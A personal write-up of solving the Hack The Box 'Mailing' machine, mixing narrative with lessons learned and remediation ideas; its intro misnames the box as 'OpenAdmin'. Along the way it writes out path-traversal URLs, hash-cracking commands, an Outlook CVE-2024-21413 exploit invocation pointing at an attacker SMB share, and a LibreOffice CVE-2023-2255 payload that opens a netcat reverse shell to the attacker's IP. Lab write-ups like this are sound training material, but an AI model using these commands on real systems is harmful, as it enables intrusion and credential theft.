---
layout: writeup
title: Mailing - HackTheBox
date: 2024-10-08 13:32:20 +0300
description: A Writeup of the Mailing Box from HackTheBox
image: # /assets/images/Mailing/Mailing.png
fig-caption: # Add figcaption (optional)
tags: [LainKusanagi, Windows, Libre Office, Hack The Box]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called OpenAdmin, and it is rated Easy by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT    STATE SERVICE
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
135/tcp open  msrpc
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
```

Looks like we have an email server and a web app here. I quickly check smb (nothing without auth), rpclient (same), enum4linux (same), and head to the IP in the browser to check port 80, which shows nothing but autocorrects in the URL bar to `mailing.htb`, so I add that to my `/etc/hosts` and move on. There is a lot to check right off the bat. 

![Mailing2.png](/assets/images/Mailing/Mailing2.png){: .responsive-image}

We have a service name called `hMailServer`, we have potential users with the names of the employees, and we have a potential LFI vulnerability with the download link which ports to `http://mailing.htb/download.php?file=instructions.pdf`. Maybe we can pick another file there. I create a users.txt file with their names. For Ruy Alonso I add:

```
ruyalonso
ruy.alonso
ralonso
r.alonso
ruy
```

And similar options for the others. 

I also check for `hMailServer` in exploit-db, and I find one non-Dos option [here](https://www.exploit-db.com/exploits/7012). It references the file inclusion vunerability I already found, and it also suggests some interesting files and what to do with them:

```
hMailServer.INI - contains two interesting fields:
- the "Administrator password" crypted with md5,
- by having knowledge of that you can calculate the MySQL root password,
  specified in the "password" field.
  You can do this by using the /Addons/Utilities/DecryptBlowfish.vbs script
```

After spending a while trying different paths, I find `http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailserver/Bin/hmailserver.ini` which contains this:

```
...
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
```

The AdministratorPassword we know is encrypted with md5, so we can crack it with hashcat (`hashcat -m 0`), and it cracks to: `homenetworkingadministrator`. So we have password to get started and can check it against our list of users. I try this, but nothing works, so maybe we can find the other password with the mentioned `DecrpytBlowfish.vbs` script, which looks like this:

```
Option Explicit

Dim oApp
Set oApp = CreateObject("hMailServer.Application")

' BEGIN: Authenticate the client.
Dim sAdminPwd
sAdminPwd = InputBox("Enter your main hMailServer administrator password.", "hMailServer")
Call oApp.Authenticate ("Administrator", sAdminPwd)
' END: Authenticate the client.

dim sInput
sInput = Inputbox("Enter encrypted password", "hMailServer")

dim sOutput
sOutput = oApp.Utilities.BlowfishDecrypt(sInput)

MsgBox sOutput

Set oApp = Nothing
```

I can't seem to figure out a way to do anything with this though. The web server isn't an hMailServer app, it's just a website to help future users authenticate to it, so there isn't any way for me to log in with these credentials. They may help me log in to the server, but I can't do much, but send emails. So I try to send a pdf which will call back to my own machine allowing me to capture the NTLM hash and potentially authenticate with it. I use [Bad-PDF](https://github.com/deepzec/Bad-Pdf), and I am able to send it with the administrator credentials (though it does need to be administrator@mailing.htb). I send to maya@mailing.htb, because she is listed as support, and we can see her email in the Instructions PDF in one of the images.  

![Mailing3.png](/assets/images/Mailing/Mailing3.png){: .responsive-image}

I get confirmation that the email is sent after using swaks (`swaks --to maya@mailing.htb --from pop@pop.com -ap --attach @bad1.pdf --server 10.10.11.14 --body "message" --header "Subject: Naughty PDF" --suppress-data`), but nothing happens to my Responder. 

I get kind of stumped here, and it turns out there is another vulnerability, not exactly related to hMailServer, but it does show up in the Google results, apparently because hMailServer was also used in a different lab for TryHackMe. [This](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file) is the exploit. It is an RCE vulnerability for Microsoft Outlook. The commands are relatively straightforward, you just need to be able to authenticate and have a valid user to send the email to. That said, I tried a bunch of different configurations, not exactly sure which port to use, which sender to use (does it need to be valid), whether to send a http link or use smb, etc. None of them worked. I caved and tryed copy/pasting someone else's command from [this writeup](https://medium.com/@xL0xKEY/htb-walk-through-mailing-7ad3bba364d4), and that didn't even work, even after a reset of the machine. 

Then the hash came in after I restarted my machine and started up responder, but before I had run the exploit. So I'm not exactly sure which command triggered the NTLM authentication, but it was likely something like this:
`python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender pop@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.3\share\sploit" --subject "Check this out ASAP"`. 

Great. We get the NTLMv2 hash and attempt to crack it was hashcat (`hashcat -m 5600...`. 

![Mailing4.png](/assets/images/Mailing/Mailing4.png){: .responsive-image}

And it cracks as `m4y4ngs4ri`. Now we have the credentials `maya`:`m4y4ngs4ri`, and we can log in with evil-winrm. 

![Mailing5.png](/assets/images/Mailing/Mailing5.png){: .responsive-image}

I search around for a bit and notice that the C:\ drive contains both `inetpub` and `wwwroot` which makes me wonder whether there is an internal only web page, but that does not appear to be the case. I check for permissions and don't notice anything interesting. I try some DLL hijacking in the `C:\User\maya\Documents\mail.py` direction as suggested from winpeas.

![Mailing6.png](/assets/images/Mailing/Mailing6.png){: .responsive-image}


I also try to re-write some files in the `C:\PHP`directory to see if they are somehow being called in a way that I can't see. 

![Mailing7.png](/assets/images/Mailing/Mailing7.png){: .responsive-image}

No luck. It turns out to be a vulnerability with one of the Installed Programs - `Libre Office 7.4.0.1`. I do check the installed programs, but I never noticed this until directed at it by the Guided Mode in Hack The Box. Kind of a bummer. It looks like it is vulnerable `CVE-2023-2255` for which there is an exploit [here](https://github.com/elweth-sec/CVE-2023-2255.git)]. 

The suggested command is this: `python3 CVE-2023-2255.py --cmd 'wget https://raw.githubusercontent.com/elweth-sec/CVE-2023-2255/main/webshell.php' --output 'exploit.odt'`, and there's not a lot of explanation in the README. Initially I thought the `--cmd` paramater could just be changed to a reverse shell, and then I could run the python on the machine, but that doesn't make any sense. I'm not even really sure what the suggested command would be for because it just downloads a webshell, so the command would need to be run from a webroot which doesn't really make sense unless you were uploading the document but not able to upload php any other way.

Regardless, what the command does is use `/samples/test.odt` from the git directory to create a file where a macro runs the code you place in the `--cmd` parameter. Then the `.odt` file must still be executed by a admin process. I still needed to find that process, and I had already tried to figure that part out earlier. It turns out that this occurs in the `C:\Important Documents` directory, so it needs to be uploaded there because there is some process that cleans out this directory, and I guess that executes the file. So I uploaded `nc.exe` to `C:\Users\maya\Documents\nc.exe` and ran `python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\Users\maya\Documents\nc.exe -e cmd.exe 10.10.14.3 445' --output 'nc.odt'`, then placed the `nc.odt` file in the `C:\Important Documents` directory. 

![Mailing8.png](/assets/images/Mailing/Mailing8.png){: .responsive-image}

And voila! We're admin, and I can grab the root.txt file. 

How did I know to do this? Well, I had to look up a writeup, which didn't itself explain how this worked. I also found another one that showed the student executing the `.odt` themselves and it looked like it worked, but I tried this again, and it does not. You have to put it in the `C:\Important Documents` and let it run. So all-in-all, a pretty frustrating box. The initial exploit didn't work until I tried it multiple times, I missed the vulnerable version of LibreOffice, and I'm still not totally sure how to know the final exploit worked as it did, because the `C:\Important Documents` could have just been getting cleaned out without being executed, and it even now seems like a different file extension should have then worked, rather than just the odt. Would that same script not have executed a `.exe` file? Certainly no way to know before hand. I did still learn some stuff though. 

### Lessons Learned
- I need to do a better job of at least reading the entire first page of Google results. Sometimes I find something useful when there is something additional further down. In this case there were two exploits I might have found when looking up hMailServer vulns, even though technically only one was specfic to hMailServer, and the other one was for Outlook which I never would have found. 
- I logged in with evil-winrm as soon as I found maya's credentials. If I had at least checked SMB first, I would have found the `Important Documents` share and at least had a better shot of knowing that even though it was blank, it might have been important. 
- I checked the installed applications, but LibreOffice didn't jump out at me and it should have given this was a Windows box. 

### Remediation Steps
Again, this was a pretty CTF-y box, and I don't love it for that. But we can still suggest some remediation steps:
- Patch the hMailServer version.
- Further email protection - train Maya not to click suspicious pdf's, and get antivirus to read them better I guess. 
- Don't have a folder which executes every `.odt` file in it as admin. 

### Further Reading
I went back in the box to understand why the malicious executable in the `C:\Important Documents` folder needed to be a `.odt` file, and the answer is: that's how the script is written. There is a script in the localadmin directory which specifies that file type to be run as root. Kinda dumb to be honest, but hey I did learn a few things, or at least reinforce other learning, so worth it. 

```
Directory: C:\Users\localadmin\Documents\scripts


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        2024-04-30   4:37 PM            841 soffice.ps1                                                          


PS C:\Users\localadmin\Documents\scripts> type soffice.ps1
type soffice.ps1
# Define the directory containing the .odt files
$directory = "C:\Important Documents\"

# Get all .odt files in the directory
$odtFiles = Get-ChildItem -Path $directory -Filter *.odt

# Loop through each .odt file
foreach ($file in $odtFiles) {
    # Start LibreOffice and open the current .odt file
    $fileName = $file.FullName
    Start-Process "C:\Program Files\LibreOffice\program\soffice.exe" -ArgumentList "--headless --view --norestore", "`"$fileName`""

    # Wait for LibreOffice to fully open the document
    Start-Sleep -Seconds 5  # Adjust the delay as needed

    # Wait for the document to close
    Start-Sleep -Seconds 5  # Adjust the delay as needed

    Stop-Process -Name "soffice" -force

    # Delete the .odt file
    Remove-Item -Path $file.FullName -Force
}

Remove-Item 'C:\Important Documents\*' -Recurse -Force

```